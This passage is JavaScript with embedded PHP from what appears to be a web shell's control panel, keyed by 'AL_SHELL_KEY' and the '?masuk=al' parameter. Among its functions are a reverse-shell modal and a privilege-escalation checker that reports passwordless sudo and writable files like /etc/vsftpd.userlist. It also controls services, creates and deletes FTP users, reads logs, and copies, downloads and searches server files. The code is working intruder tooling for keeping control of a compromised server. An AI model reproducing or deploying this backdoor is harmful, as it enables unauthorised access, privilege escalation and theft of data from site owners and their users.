    renderServicesList();
}

function updateServiceFilterButtons() {
    document.querySelectorAll('.service-filter-btn').forEach(btn => {
        btn.style.background = '#444';
        btn.style.color = '#0f0';
    });
    event.target.style.background = '#0f0';
    event.target.style.color = '#000';
}

async function serviceAction(serviceName, action) {
    try {
        const formData = new FormData();
        formData.append('service', serviceName);
        formData.append('action', action);

        const response = await fetch('?masuk=al&action=service_' + action, {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.success) {
            setTimeout(() => loadServiceList(), 500);
        } else {
            alert('Error: ' + (data.message || data.error));
        }
    } catch (error) {
        alert('Action failed: ' + error.message);
    }
}

async function viewServiceLogs(serviceName) {
    try {
        const response = await fetch(`?masuk=al&action=service_logs&service=${encodeURIComponent(serviceName)}&lines=100`);
        const data = await response.json();

        if (data.success) {
            document.getElementById('serviceLogTitle').textContent = 'Logs for ' + serviceName;
            document.getElementById('serviceLogsOutput').textContent = data.data.logs || 'No logs available';
            document.getElementById('serviceLogsDiv').style.display = 'block';
        } else {
            alert('Error: ' + (data.message || data.error));
        }
    } catch (error) {
        alert('Failed to load logs: ' + error.message);
    }
}

// Load services when modal is opened
document.addEventListener('DOMContentLoaded', function() {
    // Set up event listener for service search
    const serviceSearch = document.getElementById('serviceSearchInput');
    if (serviceSearch) {
        serviceSearch.addEventListener('input', renderServicesList);
    }

    // Load services when service modal is opened (we'll trigger this from openModal)
    const originalOpenModal = window.openModal;
    window.openModal = function(modalId) {
        if (modalId === 'serviceModal') {
            loadServiceList();
        }
        if (modalId === 'revshellModal') {
            updateRSOptions();
        }
        originalOpenModal(modalId);
    };
});

// ============================================================================
// FTP MANAGER - JavaScript Functions
// ============================================================================

// FTP Manager UI Functions
function toggleFtpQuickMenu() {
    const menu = document.getElementById('ftpQuickMenuPanel');
    menu.style.display = menu.style.display === 'none' ? 'grid' : 'none';
}

function toggleFtpConnectionInfo() {
    const panel = document.getElementById('ftpConnectionInfoPanel');
    const button = event.target;
    if (panel.style.display === 'none') {
        panel.style.display = 'block';
        button.textContent = '▲ FTP Connection Information';
        loadFtpConnectionInfo();
    } else {
        panel.style.display = 'none';
        button.textContent = '▼ FTP Connection Information';
    }
}

function togglePrivilegeCheck() {
    const panel = document.getElementById('privileCheckPanel');
    const button = event.target;
    if (panel.classList.contains('hidden')) {
        panel.classList.remove('hidden');
        button.textContent = '▲ Check Privilege Escalation Options';
        checkPrivilegeEscalation();
    } else {
        panel.classList.add('hidden');
        button.textContent = '▼ Check Privilege Escalation Options';
    }
}

// ============================================================================
// FTP MANAGEMENT FEATURE 1: Active Connections Monitor
// ============================================================================

function getActiveConnections() {
    setLoadingState('ftpConnRefreshBtn', true);
    const output = document.getElementById('ftpActiveConnections');
    output.innerHTML = '<div class="text-muted">Loading connections...</div>';

    fetch('?masuk=al&action=ftp_connections')
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const conns = data.data.connections || [];
                let html = '';

                if (conns.length === 0) {
                    html = '<div class="text-muted">No active FTP connections</div>';
                } else {
                    html = '<div class="font-bold mb-8 text-secondary">Active: ' + conns.length + '</div>';
                    html += '<div class="border-b border-green pb-8 mb-8">';
                    conns.forEach((conn, idx) => {
                        html += '🔗 ' + (conn.remote_addr || conn.raw || 'Connected') + '\n';
                    });
                    html += '</div>';
                    html += '<div class="text-10 text-gray-dark">Updated: ' + data.data.timestamp + '</div>';
                }

                output.innerHTML = html;
                showFtpFeedback('Active connections: ' + conns.length, true, 2000);
            }
        })
        .catch(e => {
            output.innerHTML = '<div class="text-danger">Error: ' + e.message + '</div>';
            showFtpFeedback('Failed to load connections', false, 3000);
        })
        .finally(() => {
            setLoadingState('ftpConnRefreshBtn', false);
        });
}

// ============================================================================
// FTP MANAGEMENT FEATURE 2: Logs Viewer
// ============================================================================

function getFtpLogs() {
    setLoadingState('ftpLogsRefreshBtn', true);
    const output = document.getElementById('ftpLogsOutput');
    const search = document.getElementById('ftpLogsSearch').value.trim();
    const lines = 50;

    output.innerHTML = '<div class="text-muted">Loading logs...</div>';

    const url = '?masuk=al&action=ftp_logs&lines=' + lines + (search ? '&search=' + encodeURIComponent(search) : '');

    fetch(url)
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const logs = data.data.logs || [];
                let html = '';

                if (logs.length === 0) {
                    html = '<div class="text-muted">No logs found' + (search ? ' matching "' + search + '"' : '') + '</div>';
                } else {
                    html = '<div class="font-bold mb-8 text-secondary">Logs: ' + logs.length + '</div>';
                    logs.forEach(log => {
                        const displayLog = log.replace(/</g, '&lt;').replace(/>/g, '&gt;');
                        html += displayLog + '\n';
                    });
                }

                output.innerHTML = html;
                showFtpFeedback('Loaded ' + logs.length + ' log entries', true, 2000);
            }
        })
        .catch(e => {
            output.innerHTML = '<div class="text-danger">Error: ' + e.message + '</div>';
            showFtpFeedback('Failed to load logs', false, 3000);
        })
        .finally(() => {
            setLoadingState('ftpLogsRefreshBtn', false);
        });
}

// ============================================================================
// FTP MANAGEMENT FEATURE 3: User Directory Management
// ============================================================================

function setUserDirectory() {
    const username = document.getElementById('ftpDirUsername').value.trim();
    const directory = document.getElementById('ftpDirPath').value.trim();

    if (!username) {
        showFtpFeedback('Please enter username', false);
        return;
    }
    if (!directory) {
        showFtpFeedback('Please enter directory path', false);
        return;
    }

    const formData = new FormData();
    formData.append('username', username);
    formData.append('directory', directory);

    fetch('?masuk=al&action=ftp_user_directory', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                showFtpFeedback(data.data.message || 'Directory set successfully', true, 4000);
                document.getElementById('ftpDirUsername').value = '';
                document.getElementById('ftpDirPath').value = '';
            } else {
                showFtpFeedback(data.data.message || 'Failed to set directory', false, 4000);
            }
        })
        .catch(e => showFtpFeedback('Error: ' + e.message, false, 4000));
}

// ============================================================================
// FTP MANAGEMENT FEATURE 4 & 5: Backup & SSL Status
// ============================================================================

function backupFtpConfig() {
    showFtpFeedback('Creating backup...', true, 1000);

    fetch('?masuk=al&action=ftp_backup_config')
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const info = data.data;
                showFtpFeedback('✓ Backup created: ' + info.backup_file, true, 5000);

                const infoDiv = document.getElementById('ftpBackupSSLInfo');
                let html = '<div class="p-10 bg-green text-dark mb-10 rounded-3">';
                html += '<div class="font-bold">✓ Backup Created</div>';
                html += '<div class="text-10 mt-4">';
                html += 'File: ' + info.backup_file + '<br>';
                html += 'Size: ' + info.size + ' bytes<br>';
                html += 'Time: ' + info.timestamp;
                html += '</div></div>';
                infoDiv.innerHTML = html;
                infoDiv.style.display = 'block';
            }
        })
        .catch(e => showFtpFeedback('Backup failed: ' + e.message, false, 4000));
}

function checkSSLStatus() {
    fetch('?masuk=al&action=ftp_ssl_status')
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const ssl = data.data;
                const infoDiv = document.getElementById('ftpBackupSSLInfo');

                let html = '<div class="p-10 mb-10 rounded-3 ' + (ssl.ssl_enabled ? 'bg-green text-dark' : 'bg-red text-white') + '">';
                html += '<div class="font-bold">' + (ssl.ssl_enabled ? '✓' : '✗') + ' SSL/TLS ' + (ssl.ssl_enabled ? 'ENABLED' : 'DISABLED') + '</div>';
                html += '</div>';

                html += '<div class="text-green text-11 leading-relaxed">';
                html += 'Cert: ' + (ssl.ssl_cert_file.includes('Not') ? ssl.ssl_cert_file : '✓ Configured') + '<br>';
                html += 'Key: ' + (ssl.ssl_key_file.includes('Not') ? ssl.ssl_key_file : '✓ Configured') + '<br>';
                html += 'TLSv1: ' + (ssl.tlsv1 ? '✓' : '✗') + '<br>';
                html += 'TLSv1.2: ' + (ssl.tlsv1_2 ? '✓' : '✗');
                html += '</div>';

                infoDiv.innerHTML = html;
                infoDiv.style.display = 'block';
            }
        })
        .catch(e => showFtpFeedback('Error: ' + e.message, false, 3000));
}

function checkPrivilegeEscalation() {
    const infoDiv = document.getElementById('privileCheckInfo');
    infoDiv.innerHTML = '<div class="text-muted">Analyzing privilege options...</div>';

    fetch('?masuk=al&action=ftp_privilege_check')
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                const options = data.data;
                let html = '<div class="text-primary">';

                // sudo check
                if (options.sudo_no_password) {
                    html += '<div class="text-green font-bold mb-8">✓ SUDO NO PASSWORD AVAILABLE!</div>';
                    html += '<div class="text-green mb-12 p-8 bg-black border-l-3 border-green">';
                    html += 'You can execute commands as root without password:<br>';
                    html += '<span class="text-warning">sudo useradd, sudo userdel, sudo passwd</span><br>';
                    html += 'This enables full FTP user management!';
                    html += '</div>';
                } else {
                    html += '<div class="text-gray-dark mb-8">ℹ️ sudo requires password</div>';
                }

                // File permissions
                if (options.file_permissions) {
                    html += '<div class="font-bold text-secondary mb-4">📁 File Permissions:</div>';
                    for (const [file, info] of Object.entries(options.file_permissions)) {
                        if (info.writable) {
                            html += '<div class="text-green">✓ ' + file + ' (writable)</div>';
                        } else if (info.readable) {
                            html += '<div class="text-danger">⚠️ ' + file + ' (readable only)</div>';
                        } else {
                            html += '<div class="text-muted">✗ ' + file + ' (no access)</div>';
                        }
                    }
                    html += '<br>';
                }

                // Groups
                if (options.current_groups && options.current_groups.length > 0) {
                    html += '<div class="font-bold text-secondary mb-4">👥 Your Groups:</div>';
                    html += '<div class="text-primary">' + options.current_groups.join(', ') + '</div><br>';
                }

                // Alternative configs
                if (options.alternative_configs && options.alternative_configs.length > 0) {
                    html += '<div class="font-bold text-secondary mb-4">⚙️ Alternative FTP Configs:</div>';
                    options.alternative_configs.forEach(config => {
                        html += '<div class="text-green text-10">' + config + '</div>';
                    });
                    html += '<br>';
                }

                // Recommendations
                html += '<div class="text-yellow font-bold mt-12 p-10 bg-dark-green border-l-3 border-yellow">💡 RECOMMENDATIONS:</div>';
                html += '<div class="text-green mt-8 leading-relaxed">';

                if (options.sudo_no_password) {
                    html += '1. ✓ Use sudo for user management (RECOMMENDED)<br>';
                } else {
                    html += '1. Check if you have sudo with password<br>';
                }

                if (options.file_permissions && options.file_permissions['/etc/vsftpd.userlist'] && options.file_permissions['/etc/vsftpd.userlist'].writable) {
                    html += '2. ✓ Direct file write to userlist (ENABLED)<br>';
                } else {
                    html += '2. Try to get write permission for /etc/vsftpd.userlist<br>';
                }

                html += '3. Ask hosting to enable proc_open/popen (available: ' + (options.available ? 'YES' : 'NO') + ')<br>';
                html += '4. Use hosting control panel (cPanel/Plesk) for safe management<br>';

                html += '</div></div>';
                infoDiv.innerHTML = html;
            }
        })
        .catch(e => {
            infoDiv.innerHTML = '<div class="text-danger">Error: ' + e.message + '</div>';
        });
}

function loadFtpConnectionInfo() {
    fetch('?masuk=al&action=ftp_status')
        .then(r => r.json())
        .then(data => {
            if (data.success && data.data) {
                const info = data.data;
                const hostname = info.hostname || 'localhost';
                const ip = info.ip || '127.0.0.1';
                const port = info.port || 21;

                let html = '<div class="text-primary">';

                // Server Info Section
                html += '<div class="mb-8">';
                html += '<div class="font-bold text-secondary mb-4">📡 SERVER INFORMATION</div>';
                html += '<div class="ml-8 text-11 leading-relaxed">';
                html += '<div>Hostname: <span class="text-warning">' + hostname + '</span></div>';
                html += '<div>IP Address: <span class="text-warning">' + ip + '</span></div>';
                html += '<div>Port: <span class="text-warning">' + port + '</span></div>';
                html += '<div>Protocol: <span class="text-secondary">FTP</span></div>';
                html += '</div></div>';

                // FileZilla Instructions
                html += '<div class="mb-8">';
                html += '<div class="font-bold text-secondary mb-4">🔌 FILEZILLA SETUP</div>';
                html += '<div class="ml-8 text-11 leading-relaxed bg-black p-8 border-l-3 border-green rounded-2">';
                html += '<div>Host: <span class="text-warning">ftp://' + ip + '</span></div>';
                html += '<div>Port: <span class="text-warning">' + port + '</span></div>';
                html += '<div>Encryption: <span class="text-danger">None (plain FTP)</span></div>';
                html += '</div></div>';

                // Command Line
                html += '<div class="mb-8">';
                html += '<div class="font-bold text-secondary mb-4">⌨️ COMMAND LINE</div>';
                html += '<div class="ml-8 text-11 leading-relaxed bg-black p-8 border-l-3 border-green rounded-2 font-mono">';
                html += '<div>Linux/Mac: <span class="text-primary">ftp ' + hostname + '</span></div>';
                html += '<div>Windows: <span class="text-primary">ftp ' + ip + '</span></div>';
                html += '</div></div>';

                // Security Notes
                html += '<div>';
                html += '<div class="font-bold text-red-light mb-6">⚠️ SECURITY NOTES</div>';
                html += '<div class="ml-8 text-11 leading-snug text-red-light">';
                html += '<div>• FTP transmits passwords in cleartext - use SFTP when possible</div>';
                html += '<div>• Enable FTPS (FTP over SSL/TLS) for encryption</div>';
                html += '<div>• Use strong passwords (minimum 8+ characters)</div>';
                html += '<div>• Restrict directory access with chroot when available</div>';
                html += '</div></div>';

                html += '</div>';

                document.getElementById('ftpConnectionInfo').innerHTML = html;
            }
        })
        .catch(e => {
            document.getElementById('ftpConnectionInfo').innerHTML = '<div class="text-danger">Error loading connection info: ' + e.message + '</div>';
        });
}

// Fetch current working directory for FTP user creation
function initFtpModal() {
    // Try to get current directory info from server
    fetch('?masuk=al&action=get_server_info')
        .then(r => r.text())
        .then(html => {
            // Try to extract current directory from server info
            const match = html.match(/Current\s+(?:Directory|Dir)[:\s]+<[^>]*>([^<]+)/i);
            if (match && match[1]) {
                const currentDir = match[1].trim();
                const homeInput = document.getElementById('ftpNewHomeDir');
                if (homeInput && !homeInput.value) {
                    homeInput.placeholder = 'Home Dir (default: ' + currentDir.substring(0, 40) + (currentDir.length > 40 ? '...)' : ')');
                }
            }
        })
        .catch(e => {
            // Silently fail - default placeholder is fine
        });
}

function checkFtpStatus() {
    fetch('?masuk=al&action=ftp_status')
        .then(r => r.json())
        .then(data => {
            const statusDiv = document.getElementById('ftpQuickStatus');
            if (data.success && data.data) {
                const status = data.data;
                const statusColor = status.running ? '#0f0' : '#f44';
                const statusText = status.running ? 'RUNNING' : 'STOPPED';
                const enabledText = status.enabled ? 'Enabled' : 'Disabled';
                const versionText = status.version !== 'Unknown' ? ` v${status.version}` : '';
                const methodText = status.detection_method ? ` [${status.detection_method}]` : '';

                statusDiv.style.color = statusColor;
                statusDiv.textContent = `${statusText} | ${enabledText}${versionText}${methodText}`;

                // Show shell capabilities info if available
                if (status.shell_capabilities && status.shell_capabilities.available && status.shell_capabilities.available.length > 0) {
                    showFtpFeedback('Available: ' + status.shell_capabilities.available.join(', '), true, 3000);
                }
            } else {
                statusDiv.style.color = '#f99';
                statusDiv.textContent = 'Status: Unknown';
            }
        })
        .catch(e => {
            const statusDiv = document.getElementById('ftpQuickStatus');
            statusDiv.style.color = '#f44';
            statusDiv.textContent = 'Error: ' + e.message;
        });
}

function enableFtpService() {
    const formData = new FormData();
    fetch('?masuk=al&action=ftp_enable', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) setTimeout(() => checkFtpStatus(), 500);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function disableFtpService() {
    const formData = new FormData();
    fetch('?masuk=al&action=ftp_disable', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) setTimeout(() => checkFtpStatus(), 500);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function restartFtpService() {
    const formData = new FormData();
    fetch('?masuk=al&action=ftp_restart', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) setTimeout(() => checkFtpStatus(), 500);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function backupFtpConfig() {
    const formData = new FormData();
    fetch('?masuk=al&action=ftp_backup', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function createFtpUser() {
    const username = document.getElementById('ftpNewUsername').value.trim();
    const password = document.getElementById('ftpNewPassword').value.trim();
    const homeDir = document.getElementById('ftpNewHomeDir').value.trim();

    if (!username) {
        showFtpFeedback('Username is required', false);
        return;
    }
    if (!password) {
        showFtpFeedback('Password is required', false);
        return;
    }

    setLoadingState('ftpCreateBtn', true);

    const formData = new FormData();
    formData.append('username', username);
    formData.append('password', password);
    formData.append('homeDir', homeDir);

    fetch('?masuk=al&action=ftp_user_create', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                showFtpFeedback(data.message || 'User created successfully!', true, 4000);
                document.getElementById('ftpNewUsername').value = '';
                document.getElementById('ftpNewPassword').value = '';
                document.getElementById('ftpNewHomeDir').value = '';
                setTimeout(() => listFtpUsers(), 1000);
            } else {
                showFtpFeedback(data.message || data.reason || 'Failed to create user', false, 5000);
            }
        })
        .catch(e => {
            showFtpFeedback('Error: ' + e.message, false, 5000);
        })
        .finally(() => {
            setLoadingState('ftpCreateBtn', false);
        });
}

function listFtpUsers() {
    setLoadingState('ftpRefreshBtn', true);

    fetch('?masuk=al&action=ftp_user_list')
        .then(r => r.json())
        .then(data => {
            const output = document.getElementById('ftpUsersList');
            const capDiv = document.getElementById('ftpUserCapabilities');

            if (data.success) {
                const users = data.data.users || [];
                const capability = data.data.capability || {};
                const canManage = data.data.can_manage || false;
                const canCreate = capability.can_create || false;
                const canDelete = capability.can_delete || false;

                let html = '';
                if (users.length === 0) {
                    html = '<div class="text-muted">No FTP users found</div>';
                } else {
                    html = '<div style="font-weight: bold; margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px solid #0f0;">Total Users: ' + users.length + '</div>';
                    html += '<div class="text-md whitespace-pre-wrap">';
                    users.forEach(user => {
                        html += '• ' + user + '\n';
                    });
                    html += '</div>';
                }
                output.innerHTML = html;

                // Update capability info and manage button states
                if (capability.methods_available && capability.methods_available.length > 0) {
                    capDiv.style.display = 'block';
                    let capText = '✓ Detection: ' + capability.methods_available.join(' | ');
                    if (canManage) {
                        capText += ' | ✓ Management ENABLED';
                    } else {
                        capText += ' | ⚠️ Management LIMITED (read-only)';
                    }
                    capDiv.textContent = capText;
                } else {
                    capDiv.style.display = 'none';
                }

                // Disable management buttons if cannot manage
                updateManagementButtons(canCreate, canDelete);

                showFtpFeedback('Loaded ' + users.length + ' user(s)', true, 2000);
            } else {
                output.innerHTML = '<div class="text-danger">Error: ' + (data.error || 'Unknown error') + '</div>';
                showFtpFeedback('Failed to load users', false, 3000);
                updateManagementButtons(false, false); // Disable all on error
            }
        })
        .catch(e => {
            const output = document.getElementById('ftpUsersList');
            output.innerHTML = '<div class="text-danger">Error: ' + e.message + '</div>';
            showFtpFeedback('Network error', false, 3000);
            updateManagementButtons(false, false); // Disable all on error
        })
        .finally(() => {
            setLoadingState('ftpRefreshBtn', false);
        });
}

function updateManagementButtons(canCreate, canDelete) {
    // Create button
    const createBtn = document.querySelector('button[onclick="createFtpUser()"]');
    if (createBtn) {
        if (canCreate) {
            createBtn.disabled = false;
            createBtn.style.opacity = '1';
            createBtn.style.cursor = 'pointer';
            createBtn.title = 'Create new FTP user';
        } else {
            createBtn.disabled = true;
            createBtn.style.opacity = '0.5';
            createBtn.style.cursor = 'not-allowed';
            createBtn.title = 'User management not available on this system';
        }
    }

    // Change password button
    const pwdBtn = document.querySelector('button[onclick="changeFtpPassword()"]');
    if (pwdBtn) {
        if (canDelete) { // If we can delete, we can probably change password too
            pwdBtn.disabled = false;
            pwdBtn.style.opacity = '1';
            pwdBtn.style.cursor = 'pointer';
            pwdBtn.title = 'Change FTP user password';
        } else {
            pwdBtn.disabled = true;
            pwdBtn.style.opacity = '0.5';
            pwdBtn.style.cursor = 'not-allowed';
            pwdBtn.title = 'Password management not available on this system';
        }
    }

    // Delete button
    const delBtn = document.querySelector('button[onclick="deleteFtpUser()"]');
    if (delBtn) {
        if (canDelete) {
            delBtn.disabled = false;
            delBtn.style.opacity = '1';
            delBtn.style.cursor = 'pointer';
            delBtn.title = 'Delete FTP user';
        } else {
            delBtn.disabled = true;
            delBtn.style.opacity = '0.5';
            delBtn.style.cursor = 'not-allowed';
            delBtn.title = 'User deletion not available on this system';
        }
    }
}

function deleteFtpUser() {
    const username = document.getElementById('ftpMgmtUsername').value.trim();
    if (!username) {
        showFtpFeedback('Please enter a username', false);
        return;
    }

    if (!confirm('⚠️ Delete FTP user "' + username + '"?\n\nThis action cannot be undone!')) {
        return;
    }

    const formData = new FormData();
    formData.append('username', username);

    fetch('?masuk=al&action=ftp_user_delete', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                showFtpFeedback(data.message || 'User deleted successfully', true, 4000);
                document.getElementById('ftpMgmtUsername').value = '';
                document.getElementById('ftpNewPass').value = '';
                setTimeout(() => listFtpUsers(), 1000);
            } else {
                showFtpFeedback(data.message || data.reason || 'Failed to delete user', false, 5000);
            }
        })
        .catch(e => showFtpFeedback('Error: ' + e.message, false, 5000));
}

function changeFtpPassword() {
    const username = document.getElementById('ftpMgmtUsername').value.trim();
    const newPassword = document.getElementById('ftpNewPass').value.trim();

    if (!username) {
        showFtpFeedback('Please enter a username', false);
        return;
    }
    if (!newPassword) {
        showFtpFeedback('Please enter a new password', false);
        return;
    }

    const formData = new FormData();
    formData.append('username', username);
    formData.append('newPassword', newPassword);

    fetch('?masuk=al&action=ftp_user_password', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                showFtpFeedback(data.message || 'Password changed successfully', true, 4000);
                document.getElementById('ftpNewPass').value = '';
            } else {
                showFtpFeedback(data.message || data.reason || 'Failed to change password', false, 5000);
            }
        })
        .catch(e => showFtpFeedback('Error: ' + e.message, false, 5000));
}

function enableFtpUser() {
    const username = document.getElementById('ftpMgmtUsername').value.trim();
    if (!username) {
        showFtpError('Please enter a username', false);
        return;
    }

    const formData = new FormData();
    formData.append('username', username);

    fetch('?masuk=al&action=ftp_user_enable', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) setTimeout(() => listFtpUsers(), 500);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function disableFtpUser() {
    const username = document.getElementById('ftpMgmtUsername').value.trim();
    if (!username) {
        showFtpError('Please enter a username', false);
        return;
    }

    const formData = new FormData();
    formData.append('username', username);

    fetch('?masuk=al&action=ftp_user_disable', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) setTimeout(() => listFtpUsers(), 500);
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}

function setFtpUserDirectory() {
    const username = document.getElementById('ftpMgmtUsername').value.trim();
    const directory = document.getElementById('ftpNewDir').value.trim();

    if (!username || !directory) {
        showFtpError('Username and directory are required', false);
        return;
    }

    const formData = new FormData();
    formData.append('username', username);
    formData.append('directory', directory);

    fetch('?masuk=al&action=ftp_user_directory', { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            showFtpError(data.message, data.success);
            if (data.success) {
                document.getElementById('ftpNewDir').value = '';
            }
        })
        .catch(e => showFtpError('Error: ' + e.message, false));
}


function showFtpFeedback(message, isSuccess = false, duration = 4000) {
    const feedbackDiv = document.getElementById('ftpFeedback');
    const feedbackMsg = document.getElementById('ftpFeedbackMsg');

    if (isSuccess) {
        feedbackMsg.style.background = '#0a0';
        feedbackMsg.style.color = '#000';
        feedbackMsg.style.borderColor = '#0f0';
        feedbackMsg.textContent = '✓ ' + message;
    } else {
        feedbackMsg.style.background = '#f44';
        feedbackMsg.style.color = '#fff';
        feedbackMsg.style.borderColor = '#f44';
        feedbackMsg.textContent = '✗ ' + message;
    }

    feedbackDiv.style.display = 'block';

    if (duration > 0) {
        setTimeout(() => {
            feedbackDiv.style.display = 'none';
        }, duration);
    }
}

function setLoadingState(buttonId, isLoading) {
    const btn = document.getElementById(buttonId);
    if (!btn) return;

    if (isLoading) {
        btn.disabled = true;
        btn.style.opacity = '0.6';
        btn.style.cursor = 'wait';
    } else {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.cursor = 'pointer';
    }
}

// ============================================================================
// FILE MANAGER ENHANCED — All Features
// ============================================================================
(function() {
    var BASE = '?masuk=<?php echo AL_SHELL_KEY ?>';
    var DIR = <?php echo json_encode($dir) ?>;
    var DIRENC = encodeURIComponent(DIR);

    // ===== CLIPBOARD =====
    var fmClipboard = JSON.parse(sessionStorage.getItem('fmClipboard') || 'null');
    function fmUpdateClipboardUI() {
        var bar = document.getElementById('fmClipboardBar');
        var info = document.getElementById('fmClipboardInfo');
        var pasteBtn = document.getElementById('pasteBtn');
        if (fmClipboard && fmClipboard.files.length > 0) {
            bar.classList.add('active');
            info.textContent = fmClipboard.action.toUpperCase() + ' ' + fmClipboard.files.length + ' item(s) from ' + fmClipboard.sourceDir;
            if (pasteBtn) pasteBtn.style.display = '';
        } else {
            bar.classList.remove('active');
            if (pasteBtn) pasteBtn.style.display = 'none';
        }
    }
    window.fmCopyFiles = function(files) {
        fmClipboard = { action: 'copy', files: files, sourceDir: DIR };
        sessionStorage.setItem('fmClipboard', JSON.stringify(fmClipboard));
        fmUpdateClipboardUI();
        alert('Copied ' + files.length + ' item(s) to clipboard');
    };
    window.fmCutFiles = function(files) {
        fmClipboard = { action: 'cut', files: files, sourceDir: DIR };
        sessionStorage.setItem('fmClipboard', JSON.stringify(fmClipboard));
        fmUpdateClipboardUI();
        alert('Cut ' + files.length + ' item(s) to clipboard');
    };
    window.fmPaste = function() {
        if (!fmClipboard || fmClipboard.files.length === 0) return alert('Clipboard is empty');
        var action = fmClipboard.action === 'cut' ? 'fm_move' : 'fm_copy';
        var fd = new FormData();
        fd.append('action', action);
        fd.append('d', fmClipboard.sourceDir);
        fd.append('destination', DIR);
        fmClipboard.files.forEach(function(f) { fd.append('selected_files[]', f); });
        fetch(BASE + '&d=' + encodeURIComponent(fmClipboard.sourceDir), { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var count = data.copied || data.moved || 0;
                alert((fmClipboard.action === 'cut' ? 'Moved' : 'Copied') + ' ' + count + ' item(s). Failed: ' + (data.failed || 0));
                if (fmClipboard.action === 'cut') fmClearClipboard();
                location.reload();
            }).catch(function(e) { alert('Error: ' + e.message); });
    };
    window.fmClearClipboard = function() {
        fmClipboard = null;
        sessionStorage.removeItem('fmClipboard');
        fmUpdateClipboardUI();
    };
    fmUpdateClipboardUI();

    // ===== COPY/MOVE MODAL =====
    window.fmOpenCopyMoveModal = function(action, files) {
        document.getElementById('fmCopyMoveAction').value = action;
        document.getElementById('fmCopyMoveTitle').textContent = action === 'copy' ? 'Copy To' : 'Move To';
        document.getElementById('fmCopyMoveExecBtn').textContent = action === 'copy' ? 'Copy' : 'Move';
        document.getElementById('fmCopyMoveDest').value = DIR;
        var list = document.getElementById('fmCopyMoveFiles');
        list.innerHTML = files.map(function(f) { return '<div>' + escapeHtml(f) + '</div>'; }).join('');
        openModal('fmCopyMoveModal');
    };
    window.fmExecCopyMove = function() {
        var action = document.getElementById('fmCopyMoveAction').value;
        var dest = document.getElementById('fmCopyMoveDest').value;
        if (!dest) return alert('Enter destination path');
        var files = fmGetSelectedFiles();
        if (files.length === 0) return alert('No files selected');
        var fd = new FormData();
        fd.append('action', action === 'copy' ? 'fm_copy' : 'fm_move');
        fd.append('d', DIR);
        fd.append('destination', dest);
        files.forEach(function(f) { fd.append('selected_files[]', f); });
        fetch(BASE + '&d=' + DIRENC, { method: 'POST', body: fd })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var count = data.copied || data.moved || 0;
                alert((action === 'copy' ? 'Copied' : 'Moved') + ' ' + count + ' item(s). Failed: ' + (data.failed || 0));
                closeModal('fmCopyMoveModal');
                if (action === 'move') location.reload();
            }).catch(function(e) { alert('Error: ' + e.message); });
    };

    // ===== BULK DOWNLOAD =====
    window.fmBulkDownload = function() {
        var files = fmGetSelectedFiles();
        if (files.length === 0) return;
        window.open(BASE + '&d=' + DIRENC + '&action=fm_bulk_download&files=' + encodeURIComponent(files.join('|')), '_blank');
    };

    // ===== FILE SEARCH =====
    window.fmDoSearch = function() {
        var q = document.getElementById('fmSearchQuery').value;
        var searchDir = document.getElementById('fmSearchDir').value || DIR;
        if (!q) return;
        var status = document.getElementById('fmSearchStatus');
        var results = document.getElementById('fmSearchResults');
        status.textContent = 'Searching...';
        results.innerHTML = '';
        fetch(BASE + '&d=' + DIRENC + '&action=fm_search&q=' + encodeURIComponent(q) + '&search_dir=' + encodeURIComponent(searchDir))
            .then(function(r) { return r.json(); })
            .then(function(data) {
                status.textContent = 'Found ' + data.total + ' result(s)' + (data.total >= data.max ? ' (limit reached)' : '');
                if (data.results.length === 0) { results.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)">No results found</div>'; return; }
                var html = '';
                data.results.forEach(function(r) {
                    var icon = r.is_dir ? '📁' : '📄';
                    var dirPath = r.is_dir ? r.path : r.path.substring(0, r.path.lastIndexOf(r.path.indexOf('/') !== -1 ? '/' : '\\'));
                    html += '<div class="fm-search-item" onclick="window.location.href=\'' + BASE + '&d=' + encodeURIComponent(r.is_dir ? r.path : dirPath) + '\'">';
                    html += '<div>' + icon + ' <strong>' + escapeHtml(r.name) + '</strong></div>';
                    html += '<div class="fm-search-path">' + escapeHtml(r.path) + '</div>';
                    if (!r.is_dir && r.size > 0) html += '<div class="fm-search-line">' + fmFormatSize(r.size) + ' | ' + r.mtime + '</div>';
                    html += '</div>';
                });
                results.innerHTML = html;
            }).catch(function(e) { status.textContent = 'Error: ' + e.message; });
    };

    // ===== CONTENT SEARCH (GREP) =====
    window.fmDoGrep = function() {
        var pattern = document.getElementById('fmGrepPattern').value;
        var grepDir = document.getElementById('fmGrepDir').value || DIR;
        var ext = document.getElementById('fmGrepExt').value;
        if (!pattern) return;
        var status = document.getElementById('fmGrepStatus');
